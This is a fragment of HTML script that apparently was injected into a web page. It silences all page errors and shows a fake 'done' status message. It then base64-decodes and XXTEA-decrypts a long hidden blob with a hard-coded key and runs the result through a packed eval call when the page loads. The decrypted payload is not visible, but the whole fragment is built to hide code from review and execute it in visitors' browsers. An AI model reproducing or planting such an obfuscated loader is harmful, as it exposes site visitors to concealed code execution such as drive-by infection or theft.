<script>window.onerror=function(){return true;}</script>
<script>
/*Extreme*/
window.defaultStatus="Íê³É";
Status="utf8to16";
function utf8to16(str){var out,i,len,c;var char2,char3;out=[];len=str.length;i=0;while(i<len){c=str.charCodeAt(i++);switch(c>>4)
{case 0:case 1:case 2:case 3:case 4:case 5:case 6:case 7:out[out.length]=str.charAt(i-1);break;case 12:case 13:char2=str.charCodeAt(i++);out[out.length]=String.fromCharCode(((c&0x1F)<<6)|(char2&0x3F));break;case 14:char2=str.charCodeAt(i++);char3=str.charCodeAt(i++);out[out.length]=String.fromCharCode(((c&0x0F)<<12)|((char2&0x3F)<<6)|((char3&0x3F)<<0));break;}}
return out.join('');}
var base64DecodeChars=new Array(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1);
function base64decode(str)
{var c1,c2,c3,c4;var i,len,out;len=str.length;i=0;out = "";while(i<len)
{do
{c1=base64DecodeChars[str.charCodeAt(i++)&0xff]}while(i<len&&c1==-1);if(c1==-1)
break;do
{c2=base64DecodeChars[str.charCodeAt(i++)&0xff]}while(i<len&&c2==-1);if(c2==-1)
break;out+=String.fromCharCode((c1<<2)|((c2&0x30)>>4));do
{c3=str.charCodeAt(i++)&0xff;if(c3==61)
return out;c3=base64DecodeChars[c3]}while(i<len&&c3==-1);if(c3==-1)
break;out+=String.fromCharCode(((c2&0XF)<<4)|((c3&0x3C)>>2));do
{c4=str.charCodeAt(i++)&0xff;if(c4==61)
return out;c4=base64DecodeChars[c4]}while(i<len&&c4==-1);if(c4==-1)
break;out+=String.fromCharCode(((c3&0x03)<<6)|c4)}
return out}
function long2str(v,w){var vl=v.length;var sl=v[vl-1]&0xffffffff;for(var i=0;i<vl;i++)
{v[i]=String.fromCharCode(v[i]&0xff,v[i]>>>8&0xff,v[i]>>>16&0xff,v[i]>>>24&0xff);}
if(w){return v.join('').substring(0,sl);}
else{return v.join('');}}
function str2long(s,w){var len=s.length;var v=[];for(var i=0;i<len;i+=4)
{v[i>>2]=s.charCodeAt(i)|s.charCodeAt(i+1)<<8|s.charCodeAt(i+2)<<16|s.charCodeAt(i+3)<<24;}
if(w){v[v.length]=len;}
return v;}
function xxtea_decrypt(str,key){if(str==""){return"";}
var v=str2long(str,false);var k=str2long(key,false);var n=v.length-1;var z=v[n-1],y=v[0],delta=0x9E3779B9;var mx,e,q=Math.floor(6+52/(n+1)),sum=q*delta&0xffffffff;while(sum!=0){e=sum>>>2&3;for(var p=n;p>0;p--){z=v[p-1];mx=(z>>>5^y<<2)+(y>>>3^z<<4)^(sum^y)+(k[p&3^e]^z);y=v[p]=v[p]-mx&0xffffffff;}
z=v[n];mx=(z>>>5^y<<2)+(y>>>3^z<<4)^(sum^y)+(k[p&3^e]^z);y=v[0]=v[0]-mx&0xffffffff;sum=sum-delta&0xffffffff;}
return long2str(v,true);}
t="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";
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0=4(5(3(0),\'\\2\\1\\6\\d\\7\'));c["\\b\\a\\8\\9"](0);',14,14,'t|x75|x66|base64decode|utf8to16|xxtea_decrypt|x63|x31|x61|x6c|x76|x65|window|x6b'.split('|'),0,{}))
/*Extreme*/
</script>